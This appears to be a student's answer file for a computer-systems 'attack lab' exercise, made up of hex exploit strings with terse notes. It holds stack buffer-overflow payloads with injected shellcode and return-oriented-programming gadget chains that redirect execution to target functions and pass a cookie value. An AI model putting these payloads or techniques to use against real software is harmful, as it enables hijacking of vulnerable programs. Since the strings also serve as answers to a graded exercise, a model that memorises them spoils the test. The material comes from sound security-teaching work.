00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9c 18 40 00 00 00 00 00

48 c7 c7 c2 df 8a 59 68
d0 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 17 68 55 00 00 00 00

0x598adfc2
0x55681718
48 c7 c7 78 17 68 55 68
e9 19 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 17 68 55 00 00 00 00
35 39 38 61 64 66 63 32 00

pop
cookie
rax2rdi
touch2
0x401abb (7+4)
0x598adfc2
0x401a97 (95+2)
0x4018d0
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
bb 1a 40 00 00 00 00 00
c2 df 8a 59 00 00 00 00
97 1a 40 00 00 00 00 00
d0 18 40 00 00 00 00 00

rsp to rax
rax+0x37(55)
rax to rdi
touch3
401b66+2 401b68
0x401aca+2 0x401acc
0x401a97
0x4019e9
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 1b 40 00 00 00 00 00
cc 1a 40 00 00 00 00 00
97 1a 40 00 00 00 00 00
e9 19 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 35
39 38 61 64 66 63 32 00
